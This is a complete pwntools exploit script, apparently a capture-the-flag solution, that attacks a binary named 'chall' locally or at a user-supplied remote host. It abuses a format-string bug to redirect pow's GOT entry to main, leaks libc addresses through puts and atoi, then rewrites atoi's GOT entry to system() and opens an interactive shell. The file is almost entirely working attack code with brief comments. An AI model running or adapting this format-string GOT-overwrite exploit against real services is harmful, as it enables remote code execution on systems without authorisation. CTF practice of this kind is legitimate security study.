#!/usr/bin/env python3
from pwn import *
from fmt_str_byte import *

# =====================
# Configuration
# =====================
binary = "./chall"
elf = context.binary = ELF(binary, checksec=False)



context.log_level = "info"                   # set to "info" for less output

# =====================
# Helpers
# =====================


def start(argv=[], *a, **kw):
    if args.REMOTE:
        HOST = input("Enter the host name: ")
        PORT = int(input("Enter the port-no: "))
        return remote(HOST, PORT)

    elif args.GDB:    
        return gdb.debug([elf.path])

    else:
        return process([elf.path])



### ======================================

def leak_address(got_entry:int)->int:
    io.recvuntil(b"A: ")
    payload1 = b'1.%11$s|' + p64(got_entry)
    io.sendline(payload1)
    io.recvuntil(b"B: ")
    payload2 = b'2'
    io.sendline(payload2)
    response = io.recvuntil(b'B:')
    print(response)
    return u64(response.split(b'.')[1].split(b'|')[0].ljust(8,b'\x00'))   



# =====================
# Exploit
# =====================
io = start()


# =====================
# GOT Entries
# =====================

puts_got = elf.got["puts"]
print(f"puts got entry:{hex(puts_got)}")
atoi_got = elf.got['atoi']
print(f"atoi got entry:{hex(atoi_got)}")
pow_got = elf.got["pow"]
print(f"pow got entry:{hex(pow_got)}")

# Main address

main_address = elf.symbols["main"]
print(f"main address:{hex(main_address)}")


### Change the pow GOT entry to point to main to create the self loop


written = len("Calculating for A: ") + 1 # 1 for atoi(A) 1
start_offset = 10   # 1 input format controller at 10$
word_size = 8 # x64 arch

#Step 1: Byte map
bmap = byte_map(main_address,pow_got)

# Step 2: Greedy order
sw = sort_writes(bmap,written)

# Step 3: Converged full payload
payload1 = b'1' + converge_payload(sw, offset_bytes=1, offset=start_offset) 
print(payload1)


io.recvuntil(b"A: ")
io.sendline(payload1)
io.recvuntil(b"B: ")
payload2 = b'2'
io.sendline(payload2)
io.recvline()
### This modifies the  GOT entry of pow to main address


### leak the puts PIE address to compute the system's PIE address
puts_offset = 0x0875a0 
atoi_offset = 0x047730
system_offset = 0x055410

puts_address = leak_address(puts_got)
print(f"puts_address:{hex(puts_address)}")
atoi_address = leak_address(atoi_got)
print(f"atoi_address:{hex(atoi_address)}")


libc_base_address = puts_address - puts_offset
print(f"libc_base_address:{hex(libc_base_address)}")

system_address = libc_base_address + system_offset
print(f"system_address:{hex(system_address)}")



### Change the atoi GOT entry to point to system 


#Step 1: Byte map
bmap = byte_map(system_address,atoi_got)

# Step 2: Greedy order
sw = sort_writes(bmap,written)

# Step 3: Converged full payload
payload1 = b'1' + converge_payload(sw, offset_bytes=1, offset=start_offset) 
print(payload1)


io.recvuntil(b"A: ")
io.sendline(payload1)
io.recvuntil(b"B: ")
payload2 = b'2'
io.sendline(payload2)
io.recvline()


#Keep interactive shell
io.interactive()

